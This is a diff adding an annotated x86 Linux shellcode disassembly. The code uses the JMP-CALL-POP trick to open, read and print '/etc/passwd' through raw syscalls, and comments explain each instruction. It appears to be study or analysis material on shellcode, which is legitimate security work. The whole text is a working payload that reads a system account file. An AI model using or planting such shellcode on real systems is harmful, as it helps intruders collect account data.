@@ -1,0 +1,30 @@
+00000000  EB36              jmp short 0x38	; step 1 JMP-CALL-POP (JMP to address 00000038)
+00000002  B805000000        mov eax,0x5		; EAX = 5, sys_open
+00000007  5B                pop ebx		; step 3 JMP-CALL-POP, EBX = "/etc/passwd"
+00000008  31C9              xor ecx,ecx		; ECX = 0
+0000000A  CD80              int 0x80		; syscall
+
+0000000C  89C3              mov ebx,eax		; save returned file descriptor
+0000000E  B803000000        mov eax,0x3		; EAX = 3 | sys_read
+00000013  89E7              mov edi,esp		; EDI points to args on stack
+00000015  89F9              mov ecx,edi		; ECX = buffer (void *buf)
+00000017  BA00100000        mov edx,0x1000	; EDX = buffer size (size_t count), 4096 bytes
+0000001C  CD80              int 0x80		; syscall
+
+0000001E  89C2              mov edx,eax		; save returned file descriptor
+00000020  B804000000        mov eax,0x4		; EAX = 4, sys_write
+00000025  BB01000000        mov ebx,0x1		; EBX = 1, stdout (int fd)
+0000002A  CD80              int 0x80		; syscall
+
+0000002C  B801000000        mov eax,0x1		; EAX = 1, sys_exit
+00000031  BB00000000        mov ebx,0x0		; EBX = 0, graceful exit (int status)
+00000036  CD80              int 0x80		; syscall
+
+00000038  E8C5FFFFFF        call dword 0x2	; step 2 JMP-CALL-POP (string "/etc/passwd")
+0000003D  2F                das			; "/"
+0000003E  657463            gs jz 0xa4		; "etc"
+00000041  2F                das			; "/"
+00000042  7061              jo 0xa5		; "pa"
+00000044  7373              jnc 0xb9		; "ss"
+00000046  7764              ja 0xac		; "wd"
+00000048  00                db 0x00		; null-terminator
